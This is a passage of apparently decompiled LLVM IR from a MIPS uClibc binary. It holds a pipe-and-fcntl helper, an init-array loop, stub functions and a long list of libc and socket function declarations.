  uselistorder i8* %tmp66, { 1, 6, 4, 2, 0, 3, 5 }
  uselistorder i32 %v2_409c98, { 2, 1, 0 }
  uselistorder i32* %stack_var_-276, { 1, 0, 2 }
  uselistorder i32* %stack_var_-272, { 1, 0, 2 }
  uselistorder i8** %stack_var_0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_4230f0.1 to i32), { 2, 3, 27, 4, 22, 23, 24, 25, 26, 19, 21, 20, 28, 30, 5, 29, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 31 }
  uselistorder i8 1, { 0, 15, 1, 22, 21, 13, 14, 2, 3, 4, 5, 6, 7, 8, 16, 17, 9, 18, 10, 11, 19, 23, 12, 20, 24, 25 }
  uselistorder i32 (i8*, i8*, ...)* @sscanf, { 3, 2, 1, 0 }
  uselistorder i8* (i8*, i8*, i32)* @strncpy, { 2, 1, 0 }
  uselistorder i8 0, { 19, 21, 3, 23, 4, 46, 24, 5, 47, 25, 0, 26, 17, 18, 15, 27, 2, 28, 11, 22, 12, 13, 14, 29, 48, 30, 31, 32, 33, 34, 35, 36, 6, 37, 38, 39, 7, 1, 10, 16, 40, 20, 41, 42, 8, 43, 9, 49, 44, 50, 51, 45 }
  uselistorder i8* (i8*, i32, %_IO_FILE*)* @fgets, { 0, 2, 1 }
  uselistorder i32 256, { 13, 15, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder %_IO_FILE* (i8*, i8*)* @fopen, { 6, 2, 5, 4, 3, 0, 1 }
  uselistorder i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_40a9a4.134, i32 0, i32 0), { 1, 0 }
  uselistorder i8* null, { 0, 9, 10, 11, 12, 6, 1, 7, 13, 8, 14, 3, 15, 16, 17, 18, 4, 19, 20, 21, 2, 22, 23, 24, 5, 25 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_409fd4, { 1, 0 }
  uselistorder label %dec_label_pc_409fb4, { 1, 0 }
  uselistorder label %dec_label_pc_409f98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_409f64.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_409f50.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_409eac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_409e18, { 1, 0 }
  uselistorder label %dec_label_pc_409d9c, { 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_409d08, { 1, 0 }
}

define i32 @function_409fec(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_409fec:
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %tmp, i32* %stack_var_0, align 4
  %v2_40a020 = ptrtoint i32* %stack_var_-16 to i32
  %v2_40a034 = insertvalue [2 x i32] undef, i32 %v2_40a020, 0
  %v3_40a034 = call i32 @pipe([2 x i32] %v2_40a034)
  %v1_40a040 = icmp eq i32 %v3_40a034, 0
  br i1 %v1_40a040, label %dec_label_pc_40a044, label %dec_label_pc_40a160

dec_label_pc_40a044:                              ; preds = %dec_label_pc_409fec
  %v1_40a050 = icmp eq i32 %arg2, 0
  br i1 %v1_40a050, label %dec_label_pc_40a0c0, label %dec_label_pc_40a054

dec_label_pc_40a054:                              ; preds = %dec_label_pc_40a044
  %v3_40a058 = load i32, i32* %stack_var_-16, align 4
  %v3_40a078 = call i32 (i32, i32, ...) @fcntl(i32 %v3_40a058, i32 3)
  %v3_40a088 = load i32, i32* %stack_var_-16, align 4
  %v3_40a0b4 = call i32 (i32, i32, ...) @fcntl(i32 %v3_40a088, i32 4)
  %v3_40a0c4.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_40a0c0

dec_label_pc_40a0c0:                              ; preds = %dec_label_pc_40a044, %dec_label_pc_40a054
  %v3_40a0c4 = phi i32 [ %tmp, %dec_label_pc_40a044 ], [ %v3_40a0c4.pre, %dec_label_pc_40a054 ]
  %v3_40a0c0 = load i32, i32* %stack_var_-16, align 4
  %v2_40a0cc = inttoptr i32 %v3_40a0c4 to i32*
  store i32 %v3_40a0c0, i32* %v2_40a0cc, align 4
  %v1_40a0d8 = icmp eq i32 %arg4, 0
  br i1 %v1_40a0d8, label %dec_label_pc_40a148, label %dec_label_pc_40a0dc

dec_label_pc_40a0dc:                              ; preds = %dec_label_pc_40a0c0
  %v3_40a100 = call i32 (i32, i32, ...) @fcntl(i32 %tmp2, i32 3)
  %v3_40a13c = call i32 (i32, i32, ...) @fcntl(i32 %tmp2, i32 4)
  br label %dec_label_pc_40a148

dec_label_pc_40a148:                              ; preds = %dec_label_pc_40a0c0, %dec_label_pc_40a0dc
  %v2_40a154 = inttoptr i32 %arg3 to i32*
  store i32 %tmp2, i32* %v2_40a154, align 4
  br label %dec_label_pc_40a160

dec_label_pc_40a160:                              ; preds = %dec_label_pc_409fec, %dec_label_pc_40a148
  %stack_var_-24.0 = phi i32 [ 1, %dec_label_pc_40a148 ], [ 0, %dec_label_pc_409fec ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 4, { 10, 9, 0, 1, 16, 22, 17, 23, 11, 12, 13, 14, 15, 18, 24, 20, 25, 19, 26, 27, 28, 29, 30, 31, 2, 3, 32, 4, 33, 34, 35, 6, 5, 36, 37, 38, 39, 40, 41, 8, 21, 7 }
  uselistorder i32 (i32, i32, ...)* @fcntl, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 3, { 4, 3, 11, 15, 12, 5, 6, 7, 8, 9, 10, 13, 14, 2, 0, 1, 16, 17, 18, 19, 20 }
  uselistorder label %dec_label_pc_40a160, { 1, 0 }
  uselistorder label %dec_label_pc_40a148, { 1, 0 }
  uselistorder label %dec_label_pc_40a0c0, { 1, 0 }
}

define i32 @function_40a180() local_unnamed_addr {
dec_label_pc_40a180:
  %s1.global-to-local = alloca i1, align 1
  store i1 true, i1* %s1.global-to-local, align 1
  %v2_40a19c3 = load i32, i32* @global_var_41b000.197, align 4
  %v2_40a1a45 = icmp eq i32 %v2_40a19c3, -1
  br i1 %v2_40a1a45, label %dec_label_pc_40a1bc, label %dec_label_pc_40a1a8

dec_label_pc_40a1a8:                              ; preds = %dec_label_pc_40a180, %dec_label_pc_40a1a8
  %v1_40a1ac = phi i32 [ %v2_40a1ac, %dec_label_pc_40a1a8 ], [ ptrtoint (i32* @global_var_41b000.197 to i32), %dec_label_pc_40a180 ]
  %v2_40a19c6 = phi i32 [ %v2_40a19c, %dec_label_pc_40a1a8 ], [ %v2_40a19c3, %dec_label_pc_40a180 ]
  %v2_40a1ac = add i32 %v1_40a1ac, -4
  call void @__pseudo_call(i32 %v2_40a19c6)
  %v1_40a19c = inttoptr i32 %v2_40a1ac to i32*
  %v2_40a19c = load i32, i32* %v1_40a19c, align 4
  %v1_40a1a4.b = load i1, i1* %s1.global-to-local, align 1
  %v1_40a1a4 = sext i1 %v1_40a1a4.b to i32
  %v2_40a1a4 = icmp eq i32 %v2_40a19c, %v1_40a1a4
  br i1 %v2_40a1a4, label %dec_label_pc_40a1bc, label %dec_label_pc_40a1a8

dec_label_pc_40a1bc:                              ; preds = %dec_label_pc_40a1a8, %dec_label_pc_40a180
  %v4_40a1c8 = load i32, i32* @v0, align 4
  ret i32 %v4_40a1c8

; uselistorder directives
  uselistorder i32 %v2_40a19c, { 1, 0 }
  uselistorder i32 -4, { 1, 0 }
  uselistorder i32 -1, { 4, 6, 22, 38, 7, 8, 23, 9, 24, 10, 25, 11, 26, 5, 12, 27, 39, 28, 29, 40, 41, 30, 31, 32, 33, 42, 34, 35, 36, 13, 14, 43, 37, 1, 15, 16, 2, 3, 17, 44, 45, 18, 19, 46, 47, 0, 20, 21 }
  uselistorder i32* @global_var_41b000.197, { 1, 0 }
  uselistorder i1 true, { 1, 0 }
  uselistorder i32 1, { 23, 53, 112, 111, 214, 215, 115, 114, 113, 96, 54, 119, 118, 117, 116, 97, 216, 217, 120, 122, 110, 121, 61, 74, 124, 123, 27, 75, 127, 126, 125, 62, 129, 128, 76, 77, 55, 131, 130, 132, 14, 134, 133, 18, 218, 26, 78, 56, 57, 136, 135, 212, 138, 137, 17, 16, 28, 140, 139, 63, 58, 98, 64, 142, 141, 65, 143, 66, 145, 144, 67, 146, 68, 69, 99, 70, 100, 150, 149, 148, 147, 21, 152, 151, 155, 154, 153, 219, 220, 221, 158, 157, 156, 19, 81, 82, 80, 79, 59, 222, 223, 162, 161, 160, 159, 15, 224, 225, 52, 163, 101, 13, 4, 11, 10, 8, 7, 12, 6, 9, 226, 165, 164, 213, 166, 167, 168, 169, 83, 170, 102, 29, 30, 103, 71, 172, 171, 72, 174, 173, 73, 84, 85, 176, 175, 86, 49, 210, 50, 211, 177, 104, 227, 178, 31, 228, 229, 180, 179, 32, 230, 231, 232, 20, 87, 233, 0, 1, 37, 184, 183, 182, 181, 234, 185, 189, 188, 187, 186, 89, 88, 2, 39, 38, 195, 194, 193, 192, 191, 190, 33, 34, 196, 35, 197, 25, 90, 3, 40, 199, 198, 201, 200, 91, 235, 236, 41, 237, 238, 42, 24, 239, 202, 240, 45, 43, 92, 241, 93, 242, 51, 243, 244, 245, 205, 204, 203, 22, 246, 46, 60, 105, 94, 48, 47, 207, 206, 247, 106, 248, 107, 249, 250, 251, 36, 108, 44, 252, 109, 5, 95, 209, 208 }
  uselistorder label %dec_label_pc_40a1a8, { 1, 0 }
}

declare i8* @strcpy(i8*, i8*) local_unnamed_addr

declare i32 @getrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @ioctl(i32, i32, ...) local_unnamed_addr

declare i32 @vsprintf(i8*, i8*, i32) local_unnamed_addr

declare i32 @pthread_create(i32*, i32*, i32* (i32*)*, i32*) local_unnamed_addr

declare i32 @pthread_attr_init(i32*) local_unnamed_addr

declare void @pthread_exit(i32*) local_unnamed_addr

declare i32 @usleep(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @fscanf(%_IO_FILE*, i8*, ...) local_unnamed_addr

declare i8* @fgets(i8*, i32, %_IO_FILE*) local_unnamed_addr

declare i32* @memcpy(i32*, i32*, i32) local_unnamed_addr

declare void @perror(i8*) local_unnamed_addr

declare i32 @dup2(i32, i32) local_unnamed_addr

declare i32 @tolower(i32) local_unnamed_addr

declare i32 @system(i8*) local_unnamed_addr

declare i32* @malloc(i32) local_unnamed_addr

declare i32 @sleep(i32) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @chmod(i8*, i32) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @accept(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @setrlimit(i32, %rlimit*) local_unnamed_addr

declare i32 @fprintf(%_IO_FILE*, i8*, ...) local_unnamed_addr

declare i8* @strcat(i8*, i8*) local_unnamed_addr

declare i32 @bind(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @if_nametoindex(i8*) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @umask(i32) local_unnamed_addr

declare i8* @strstr(i8*, i8*) local_unnamed_addr

declare i32 @rand() local_unnamed_addr

declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @pthread_attr_setstacksize(i32*, i32) local_unnamed_addr

declare i8* @strncpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @unlink(i8*) local_unnamed_addr

declare i32 @memcmp(i32*, i32*, i32) local_unnamed_addr

declare i32 @listen(i32, i32) local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @sscanf(i8*, i8*, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v0_40a4b0 = load i32, i32* @gp, align 4
  %v1_40a4b0 = add i32 %v0_40a4b0, -32752
  %v2_40a4b0 = inttoptr i32 %v1_40a4b0 to i32*
  %v3_40a4b0 = load i32, i32* %v2_40a4b0, align 4
  call void @__pseudo_call(i32 %v3_40a4b0)
  %v0_40a4bc = load i32, i32* @v0, align 4
  ret i32 %v0_40a4bc

; uselistorder directives
  uselistorder void (i32)* @__pseudo_call, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0, 28, 29 }
}

declare i32* @dlsym(i32*, i8*) local_unnamed_addr

declare i32 @regcomp(%re_pattern_buffer*, i8*, i32) local_unnamed_addr

declare %_IO_FILE* @fopen(i8*, i8*) local_unnamed_addr

declare i32* @memset(i32*, i32, i32) local_unnamed_addr

declare i32 @fclose(%_IO_FILE*) local_unnamed_addr

declare i32 @regexec(%re_pattern_buffer*, i8*, i32, [1 x %_TYPEDEF_regmatch_t], i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @pthread_mutex_unlock(i32*) local_unnamed_addr

declare i32 @sprintf(i8*, i8*, ...) local_unnamed_addr

declare i32 @getsockopt(i32, i32, i32, i32*, i32*) local_unnamed_addr

declare i32 @stat(i8*, %stat*) local_unnamed_addr

declare i32 @fwrite(i32*, i32, i32, %_IO_FILE*) local_unnamed_addr

declare i32 @pthread_mutex_destroy(i32*) local_unnamed_addr

declare i32 @pthread_mutex_lock(i32*) local_unnamed_addr

declare i32* @__errno_location() local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @pthread_mutex_init(i32*, i32*) local_unnamed_addr

declare i32 @strlen(i8*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @toupper(i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @pthread_attr_setdetachstate(i32*, i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @pthread_join(i32, i32**) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare void @free(i32*) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

define i32 @_fini() local_unnamed_addr {
entry:
  %v4_40a6e0 = load i32, i32* @v0, align 4
  ret i32 %v4_40a6e0
}

define i32 @_fdata() local_unnamed_addr {
entry:
  %v0_41b02c = load i32, i32* @v0, align 4
  ret i32 %v0_41b02c
}

define i32 @__RLD_MAP() local_unnamed_addr {
entry:
  %v0_41b0f0 = load i32, i32* @v0, align 4
  ret i32 %v0_41b0f0

; uselistorder directives
  uselistorder i32 0, { 112, 290, 291, 292, 293, 294, 170, 171, 275, 172, 173, 52, 53, 113, 295, 124, 0, 80, 79, 296, 148, 297, 174, 175, 54, 55, 298, 176, 177, 299, 300, 81, 301, 178, 179, 180, 181, 182, 183, 187, 188, 184, 185, 100, 186, 99, 189, 190, 115, 116, 302, 114, 303, 306, 27, 304, 95, 102, 106, 93, 94, 305, 127, 125, 126, 307, 191, 276, 284, 47, 28, 128, 72, 310, 29, 308, 96, 103, 107, 110, 111, 104, 309, 117, 131, 129, 130, 311, 192, 277, 56, 57, 312, 313, 149, 150, 314, 315, 151, 152, 316, 317, 278, 153, 154, 318, 155, 156, 319, 320, 279, 157, 158, 321, 159, 160, 322, 161, 162, 323, 324, 132, 163, 164, 325, 326, 327, 118, 329, 328, 30, 97, 98, 330, 193, 280, 331, 332, 333, 334, 335, 133, 336, 337, 338, 339, 341, 31, 105, 342, 285, 340, 134, 343, 344, 135, 345, 346, 347, 348, 349, 137, 350, 351, 352, 136, 353, 15, 14, 13, 12, 11, 10, 9, 32, 73, 33, 74, 194, 195, 196, 138, 354, 139, 355, 356, 82, 75, 58, 140, 357, 83, 358, 359, 197, 198, 360, 141, 59, 120, 199, 200, 17, 18, 201, 202, 119, 165, 361, 362, 363, 364, 286, 287, 166, 365, 366, 288, 167, 367, 203, 204, 205, 206, 19, 20, 207, 208, 289, 142, 368, 369, 209, 210, 60, 370, 371, 372, 373, 76, 211, 212, 84, 61, 62, 216, 217, 85, 213, 374, 214, 215, 375, 376, 377, 63, 378, 379, 380, 381, 64, 65, 143, 382, 383, 384, 385, 386, 87, 86, 16, 1, 387, 218, 219, 388, 220, 221, 389, 390, 281, 2, 144, 391, 392, 48, 145, 393, 394, 121, 146, 3, 88, 395, 4, 396, 282, 397, 398, 66, 67, 68, 399, 69, 70, 400, 71, 401, 402, 403, 404, 46, 405, 5, 406, 89, 407, 408, 409, 6, 7, 410, 411, 412, 413, 42, 41, 90, 414, 415, 222, 223, 51, 8, 416, 91, 92, 108, 418, 419, 224, 225, 34, 417, 49, 77, 283, 420, 43, 21, 22, 226, 227, 421, 422, 423, 35, 45, 424, 101, 425, 36, 426, 168, 23, 24, 109, 427, 428, 228, 229, 25, 26, 37, 38, 39, 78, 169, 429, 230, 231, 44, 147, 50, 40, 122, 123, 430, 232, 431, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 432, 433, 434, 435, 436 }
  uselistorder i32* @v0, { 3, 4, 5, 1, 0, 6, 2 }
}

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i64 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16 @__decompiler_undefined_function_4() local_unnamed_addr

declare i32* (i32*)* @__decompiler_undefined_function_5() local_unnamed_addr

declare i16* @__decompiler_undefined_function_6() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

attributes #0 = { nounwind readnone }
